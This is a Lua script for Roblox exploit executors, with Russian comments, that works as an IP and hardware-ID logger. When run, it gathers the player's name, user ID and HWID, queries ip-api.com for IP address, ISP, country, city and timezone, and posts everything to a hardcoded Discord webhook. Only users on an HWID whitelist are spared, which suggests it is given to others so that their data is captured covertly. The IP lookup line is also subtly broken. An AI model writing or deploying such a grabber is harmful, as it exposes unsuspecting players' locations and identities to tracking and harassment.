local player = game:GetService("Players").LocalPlayer
local lp = game:GetService("Players").LocalPlayer
local valid = false

-- 1. ОБНОВИ ЭТУ БЕЛЫЙ СПИСОК СВОИМИ ДАННЫМИ:
local whitelist = {
    {HWID = 'C017884D-908B-4482-ACDB-2E4A3C1476CF', IP = "fsddssdggfd"},
    -- Добавь свои HWID сюда
    -- {HWID = 'ЕЩЕ_ОДИН_HWID', IP = "ЕЩЕ_ОДИН_НИК"},
}

if game:IsLoaded() then
    local player_name = player.Name
    local player_id = player.UserId
    
    -- 2. ЗАМЕНИ ЭТУ ССЫЛКУ НА СВОЙ DISCORD WEBHOOK:
    local webhook_url = "https://discord.com/api/webhooks/1456754463422418995/c2Ak9Vr2AcRRP9dDuCCYUfJvdnY6T0vFcffpbmhuYWrCakvLoJaN1rp-l6Ce05egl4i0"

    local hwid = game:GetService("RbxAnalyticsService"):GetClientId()

    local place_id = game.PlaceId
    local place_name = game:GetService("MarketplaceService"):GetProductInfo(place_id).Name

    local ip_info = syn and syn.request or http_request or request({
        Url = "http://ip-api.com/json",
        Method = "GET"
    })

    getgenv().ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)

    local current_time = os.date("%Y-%m-%d %H:%M:%S")

    local embed = {
        {
            ["title"] = "Executed",
            ["description"] = "User data",
            ["color"] = 0xFF0000,
            ["fields"] = {
                {
                    ["name"] = "Name",
                    ["value"] = player_name,
                    ["inline"] = true
                },
                {
                    ["name"] = "Display name",
                    ["value"] = lp.DisplayName,
                    ["inline"] = true
                },
                {
                    ["name"] = "ID",
                    ["value"] = tostring(player_id),
                    ["inline"] = true
                },
                {
                    ["name"] = "HWID",
                    ["value"] = hwid,
                    ["inline"] = false
                },
                {
                    ["name"] = "Game",
                    ["value"] = place_name,
                    ["inline"] = false
                },
                {
                    ["name"] = "Time",
                    ["value"] = current_time,
                    ["inline"] = false
                },
                {
                    ["name"] = "IP",
                    ["value"] = getgenv().ipinfo_table.query,
                    ["inline"] = false
                },
                {
                    ["name"] = "Provider",
                    ["value"] = getgenv().ipinfo_table.isp,
                    ["inline"] = true
                },
                {
                    ["name"] = "Country",
                    ["value"] = getgenv().ipinfo_table.country,
                    ["inline"] = true
                },
                {
                    ["name"] = "City",
                    ["value"] = getgenv().ipinfo_table.city,
                    ["inline"] = true
                },
                {
                    ["name"] = "Time zone",
                    ["value"] = getgenv().ipinfo_table.timezone,
                    ["inline"] = true
                }
            }
        }
    }

    -- 3. ПРОВЕРЬ СВОЙ HWID:
    print("Your HWID:", hwid) -- Этот принт покажет тебе твой HWID
    print("Your Name:", player_name)
    print("Your UserId:", player_id)

    for _, player in ipairs(whitelist) do
        if player.HWID == hwid then
            valid = true
            print('You are in whitelist!')
            break
        end
    end


    if valid then
        print('You are in Whitelist - No logs sent')
    else
        print('Sending logs to Discord...')
        local success, error = pcall(function()
            local request_func = syn and syn.request or http_request or request
            request_func({
                Url = webhook_url,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = game:GetService("HttpService"):JSONEncode({["embeds"] = embed})
            })
        end)
        
        if success then
            print('Logs sent successfully!')
        else
            print('Error sending logs:', error)
        end
    end
end
